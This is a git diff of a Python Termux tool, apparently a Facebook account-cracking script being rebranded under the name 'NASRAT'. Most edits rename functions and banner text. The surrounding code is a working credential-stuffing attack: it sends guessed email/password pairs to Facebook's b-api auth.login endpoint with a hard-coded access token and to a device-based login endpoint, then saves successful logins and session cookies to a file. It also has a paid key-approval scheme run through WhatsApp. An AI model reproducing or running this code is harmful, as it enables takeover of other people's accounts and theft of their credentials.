@@ -98,9 +98,9 @@ _   _    _    ____  ____      _  _____
 [â—‡]-------------------------------------------------------
  [â—‡] DEVELOPER  : NASRAT&ARYAN
  [â—‡] GITHUB     : Nasrat99845.git
- [â—‡] FACEBOOK   : Loy Rayess kabul
+ [â—‡] FACEBOOK   : LOY RAYESS KABUL
  [â—‡] STATUS     : Free
- [â—‡] VIRSION    : 2.4
+ [â—‡] VIRSION    : 1
  [â—‡]  TEAM      :   NASRAT& ARYAN
  [â—‡]------------------------------------------------------
 \033[1;37mTELEGRAM GROUP (HACKIN TECH{ M }\033[1;37m 
@@ -110,7 +110,7 @@ _   _    _    ____  ____      _  _____
 
 
 
-def reg():
+def NASRAT():
     os.system('termux-setup-storage')
     os.system('clear')
     os.system('https://www.facebook.com/profile php?id=100001358458659&mibextid=ZbWKwL')
@@ -119,10 +119,10 @@ def reg():
     print ('                     Checking Approval')
     time.sleep(1) 
     try:
-        to = open('/sdcard/Android/.Fake.txt', 'r').read()
+        to = open('/sdcard/Android/.NASRAT.txt', 'r').read()
     except (KeyError, IOError):
-        reg2()
-    r = requests.get('https://raw.githubusercontent.com/Fake.txt/FILE/main/ap.txt').text
+        NASRAT2()
+    r = requests.get('https://github.com/Nasrat99845/NASRAT.txt/FILE/main/ap.txt').text
     if to in r:
         time.sleep(2)
         bsn_menu()
@@ -141,9 +141,9 @@ def reg():
         time.sleep(3.5)
         tks = 'Dear%20Admin NASRAT,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+to
         os.system('am start https://wa.me/+923168609351?text=' + tks)
-        reg()
+        NASRAT()
 
-def reg2():
+def NASRAT2():
     os.system('clear')
     logo()
     print('')
@@ -158,10 +158,10 @@ def reg2():
     time.sleep(3.5)
     tks = 'Dear%20NASRAT-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
     os.system('am start https://wa.me/+923168609351?text=' + tks)
-    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
+    sav = open('/sdcard/Android/.NASRAT.txt', 'w')
     sav.write(id)
     sav.close()
-    reg()
+    NASRAT()
 
 
 
@@ -207,10 +207,10 @@ def bsn_menu():
     ipm = requests.get(url_ip).json() 
     IP = ipm["origin"]
     print("             [*]. CREATED BY : NASRAT");time.sleep (0.03)
-    print("             [*]. FACEBOOK   : Loy Rayess Kabul");time.sleep (0.03)
+    print("             [*]. FACEBOOK   : LOY RAYESS KABUL");time.sleep (0.03)
     print("             [*]. GITHUB     : Nasrat99845");time.sleep (0.03)   
-    print("             [*]. VERSION    : 2.5.6");time.sleep (0.03)
-    print("             [*]. TOOL TYPE  : PAID");time.sleep (0.03)
+    print("             [*]. VERSION    : 1");time.sleep (0.03)
+    print("             [*]. TOOL Version : PAID");time.sleep (0.03)
     print("             [*]. IP ADDRESS : [%s]\n"%(IP));time.sleep(0.01)
     print("   \033[1;97m              Menu")
     print("-----------------=\<------------------")
@@ -263,7 +263,7 @@ class __bsn__:
             except: pass
             p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
             if "access_token" in p:
-                print('\r [OK-NASRATI] %s | %s ' % (user,pw))
+                print('\r [NASRATI] %s | %s ' % (user,pw))
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
                 open('NASRAT-ok.txt' , 'a').write('%s\n' % wrt)
@@ -346,7 +346,7 @@ class __bsn__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [OK-NASRAT] {user} | {pw}')
+                    print(f'\r{H} [NASRAT] {user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
                     open('NASRAT-ok.txt' , 'a').write('%s\n' % wrt)
@@ -459,6 +459,7 @@ class __bsn__:
 
 
 if __name__ == '__main__':
-    reg()
+    NASRAT()
+
 
 
